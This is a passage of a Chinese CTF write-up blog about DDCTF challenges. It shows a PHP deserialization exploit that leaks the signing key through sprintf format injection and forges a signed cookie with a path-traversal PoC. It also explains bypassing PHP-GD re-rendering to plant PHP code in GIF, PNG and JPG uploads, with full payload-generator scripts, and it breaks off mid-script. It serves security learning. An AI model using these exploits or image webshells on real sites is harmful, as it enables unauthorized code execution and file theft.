<h3 id="利用源码"><a href="#利用源码" class="headerlink" title="利用源码"></a>利用源码</h3><p>主要逻辑在这么几个地方：</p>
<p>控制$path变量，读取flag文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line"><span class="keyword">if</span> (strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;response($data = file_get_contents($path) , <span class="string">'Congratulations'</span>); </span><br><span class="line"><span class="comment">//读出$path路径下的文件，并且用response()回显</span></span><br></pre></td></tr></table></figure>



<p>修改$session值，通过反序列化漏洞重写$path成员变量，使其为<code>flag.txt</code>所在路径。</p>
<p>那么需要满足<code>Cookie内ddctf_id的内容的后32位 === md5（密钥.去除摘要后的内容）</code></p>
<p>所以我们要得到密钥<code>$this-&gt;eancrykey</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$hash = substr($session, strlen($session) - <span class="number">32</span>); <span class="comment">//$hash = $session的后32位</span></span><br><span class="line">$session = substr($session, <span class="number">0</span>, strlen($session) - <span class="number">32</span>); <span class="comment">//去除$session的后32位校验</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"hash: $hash&lt;br&gt;session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey . $session)) &#123;</span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>, <span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//如果ddctf_id的内容的后32位不等于 md5(密钥 + 去除最后32位校验后ddctf_id的内容)，返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$session = unserialize($session); <span class="comment">//**反序列化** $path变量控制点</span></span><br></pre></td></tr></table></figure>



<p>然后寻找到一处蜜汁代码，利用<code>sprintf格式化注入</code>即可达到目的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">        $_POST[<span class="string">"nickname"</span>],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;<span class="comment">//遍历数组arr的每一个键名存入$k,键值存入$v</span></span><br><span class="line">    $data = sprintf($data, $v);<span class="comment">//蜜汁操作，存在sprintf格式化注入</span></span><br><span class="line">    <span class="comment">//post nickname=%s 获取key.txt内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">parent</span>::response($data, <span class="string">"Welcome"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里简单介绍下原理：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">已知 $arr=("sketch_pl4ne[%s]", $secret_key); $data = "Wlecome my friend %s";</span></span><br><span class="line"><span class="comment">那么 foreach($arr as $k =&gt; $v)&#123;$data = sprintf($data, $v);&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一次：$data = sprintf("Wlecome my friend %s", $v1) = "Wlecome my friend sketch_pl4ne[%s]"</span></span><br><span class="line"><span class="comment">第二次：$data = sprintf("Wlecome my friend sketch_pl4ne[%s]", $v2) = "Wlecome my friend </span></span><br><span class="line"><span class="comment">sketch_pl4ne[$secret_key]";</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">所以POST的nickname中含有%s，即可获得密钥$this-&gt;eancrykey</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>在session_creat()中注意，Cookie中的字段内容都是经过序列化操作的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$userdata = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid, <span class="keyword">TRUE</span>)) ,</span><br><span class="line">			<span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">			<span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">			<span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		);</span><br><span class="line">        <span class="comment">//基于你真实的ip和ua设置一个数组$userdata</span></span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata); <span class="comment">//把$userdata数组序列化后赋值给$cookiedata</span></span><br><span class="line">        $cookiedata = $cookiedata . md5(<span class="keyword">$this</span>-&gt;eancrykey . $cookiedata);</span><br></pre></td></tr></table></figure>

<p>在session_read()中结合index()，我们注意到只需要满足<code>$session = unserialize($session);</code>之前的判断条件，就可以反序列化达到目的，后面的代码条件并没有必要满足。</p>
<p>于是我们构造poc：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    class Application()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = <span class="keyword">new</span> Application();</span><br><span class="line">    $payload = serialize($payload);</span><br><span class="line">	$payload = $payload.md5(<span class="string">"EzblrbNS"</span>.$payload);</span><br><span class="line">	<span class="keyword">echo</span> urlencode($payload);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>自己在本地跑一下，得到<code>ddctf_id</code>的内容，Get flag</p>
<p><img src="https://i.loli.net/2019/07/07/5d20e3c1ce9d880929.png" alt="2.png"></p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>这道题挂了，白费我一上午时间，我还以为是有什么我不知道的<code>sao</code>操作，淦。</p>
<p>考察点在于<code>php-GD</code>库二次渲染绕过 ，相当于<code>Upload-labs</code>的<code>pass-16</code>的一部分，所以这里我写一下pass-16的题解。</p>
<h3 id="上传gif图片马"><a href="#上传gif图片马" class="headerlink" title="上传gif图片马"></a>上传gif图片马</h3><p>直接在gif文件尾部写入php语句，上传之后下载回来，发现写入的代码没了，所以不能直接写入。</p>
<p>那我们先上传一张正常的<code>pre.gif</code>上去，再把渲染过的图片下载下来，用<code>winhex</code>对比一下：</p>
<p><img src="https://i.loli.net/2019/07/09/5d24758d445e158993.png" alt="1.png"></p>
<p>白色表示相同的部分，可以看出尽管被压缩了，但是还是有一部分是相同的，我们在相同的地方插入代码：<code>&lt;?php phpinfo();?&gt;</code></p>
<p>因为可能不小心损坏了文件头导致上传失败，多fuzz几下就上传成功了，然后下载下来验证图片马是否写入成功：</p>
<p><img src="https://i.loli.net/2019/07/09/5d24758d2ecde12075.png" alt="2.png"></p>
<p><strong><em>写入成功 ~</em></strong></p>
<h3 id="上传png图片马"><a href="#上传png图片马" class="headerlink" title="上传png图片马"></a>上传png图片马</h3><p>png格式的图片相对gif要复杂些，想要插入php语句的话，我们需要先了解png图片格式。</p>
<h4 id="png文件组成"><a href="#png文件组成" class="headerlink" title="png文件组成"></a>png文件组成</h4><p>png文件由文件头+数据块的形式组成。可形象地描述为：png格式 = <code>89 50 4E 47 0D 0A 1A 0A</code>（文件头）+ 数据块 + 数据块 + 数据块……</p>
<h4 id="chunk数据块"><a href="#chunk数据块" class="headerlink" title="chunk数据块"></a>chunk数据块</h4><p>png定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块中定义了三个标准数据块(IHDR, IDAT, IEND)，每个png文件都必须包含它们。</p>
<table>
<thead>
<tr>
<th>数据块符号</th>
<th>数据块名称</th>
<th>多数据块</th>
<th>可选否</th>
<th>位置限制</th>
</tr>
</thead>
<tbody><tr>
<td>IHDR</td>
<td>文件头数据块</td>
<td>否</td>
<td>否</td>
<td>第一块</td>
</tr>
<tr>
<td>cHRM</td>
<td>基色和白色点数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>gAMA</td>
<td>图像γ数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>sBIT</td>
<td>样本有效位数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE和IDAT之前</td>
</tr>
<tr>
<td>PLTE</td>
<td>调色板数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>bKGD</td>
<td>背景颜色数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>hIST</td>
<td>图像直方图数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>tRNS</td>
<td>图像透明数据块</td>
<td>否</td>
<td>是</td>
<td>在PLTE之后IDAT之前</td>
</tr>
<tr>
<td>oFFs</td>
<td>(专用公共数据块）</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>pHYs</td>
<td>物理像素尺寸数据块</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>sCAL</td>
<td>(专用公共数据块）</td>
<td>否</td>
<td>是</td>
<td>在IDAT之前</td>
</tr>
<tr>
<td>IDAT</td>
<td>图像数据块</td>
<td>是</td>
<td>否</td>
<td>与其他IDAT连续</td>
</tr>
<tr>
<td>tIME</td>
<td>图像最后修改时间数据块</td>
<td>否</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>tEXt</td>
<td>文本信息数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>zTXt</td>
<td>压缩文本数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>fRAc</td>
<td>(专用公共数据块）</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFg</td>
<td>(专用公共数据块）</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFt</td>
<td>(专用公共数据块）</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>gIFx</td>
<td>(专用公共数据块）</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr>
<td>IEND</td>
<td>图像结束数据</td>
<td>否</td>
<td>否</td>
<td>最后一个数据块</td>
</tr>
</tbody></table>
<h4 id="数据块结构"><a href="#数据块结构" class="headerlink" title="数据块结构"></a>数据块结构</h4><table>
<thead>
<tr>
<th>名称</th>
<th>字节数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Length（长度）</td>
<td>4字节</td>
<td>指定数据块中数据域的长度，其长度不超过（231－1）字节</td>
</tr>
<tr>
<td>Chunk Type Code（数据块类型码）</td>
<td>4字节</td>
<td>数据块类型码由 ASCII 字母（A - Z 和 a - z）组成</td>
</tr>
<tr>
<td>Chunk Data（数据块数据）</td>
<td>可变长度</td>
<td>存储按照 Chunk Type Code 指定的数据</td>
</tr>
<tr>
<td>CRC（循环冗余检测）</td>
<td>4字节</td>
<td>存储用来检测是否有错误的循环冗余码</td>
</tr>
</tbody></table>
<p>其中的CRC是循环冗余校验码，主要用于检测是否有错误的编码，只能检错，不能像海明校验码一样纠错。</p>
<h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><p>文件头数据块，在CTF中常见的修改图片宽高就是修改这前八个字节，分别对应宽和高。</p>
<p>由于存在CRC校验码，直接修改宽高可能会显示错误，这时候可以写脚本爆破出需要修改的宽或者高。</p>
<h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>调色板数据块(辅助数据块)，对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致png图像不合法。</p>
<h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块，这里储存了图片实际的数据内容。</p>
<h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>图像结束数据块，png图像总是以图像结束数据块结尾：<code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></p>
<h4 id="写入php代码"><a href="#写入php代码" class="headerlink" title="写入php代码"></a>写入php代码</h4><p><strong>法一</strong>：因为FLTE数据块主要采用CRC校验码验证完整性，所以这里可以尝试在PLTE数据块插入语句，然后用脚本生成CRC校验码，笔者这里没有找到含有FLTE数据块的png格式图片，这里贴一下原作者<strong>@Yang</strong>的图片以及脚本：</p>
<p>写入FLTE数据块</p>
<p><img src="https://i.loli.net/2019/07/09/5d24758d45b8099324.png" alt="3.png"></p>
<p>CRC生成脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br></pre></td></tr></table></figure>

<p><strong>法二</strong>：国外大牛的脚本一把梭……</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方法：<code>php png_payload.php xxx.png</code></p>
<p>将生成图片<code>1.png</code>上传，然后验证是否成功</p>
<p><img src="https://i.loli.net/2019/07/09/5d24758d1c93e27172.png" alt="4.png"></p>
<p><strong><em>写入成功~</em></strong></p>
<h3 id="上传jpg格式图片马"><a href="#上传jpg格式图片马" class="headerlink" title="上传jpg格式图片马"></a>上传jpg格式图片马</h3><p>这个就是DDCTF这次的题目，方法大致有两种。</p>
<p><strong>法一</strong>：比较图片，fuzz插入php代码，参考上传gif图片马。</p>
<p><strong>法二</strong>：国外大牛脚本一把梭……</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() <span class="keyword">and</span> imagecopyresampled().</span><br><span class="line">    It <span class="keyword">is</span> necessary that the size <span class="keyword">and</span> quality of the initial image are the same <span class="keyword">as</span> those of the processed image.</span><br><span class="line"></span><br><span class="line">    <span class="number">1</span>) Upload an arbitrary image via secured files upload script</span><br><span class="line">    <span class="number">2</span>) Save the processed image <span class="keyword">and</span> launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method <span class="keyword">is</span> used, the following problems can occur:</span><br><span class="line">    <span class="number">1</span>) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    <span class="number">2</span>) The jpg_payload.php script outputs <span class="string">"Something's wrong"</span>.</span><br><span class="line">    If this happens, <span class="keyword">try</span> to change the payload (e.g. add some symbols at the beginning) <span class="keyword">or</span> <span class="keyword">try</span> another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/<span class="number">2012</span>/<span class="number">06</span>/encoding-web-shells-<span class="keyword">in</span>-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        die(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!isset($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        die(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, TRUE);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    die(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    die(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span 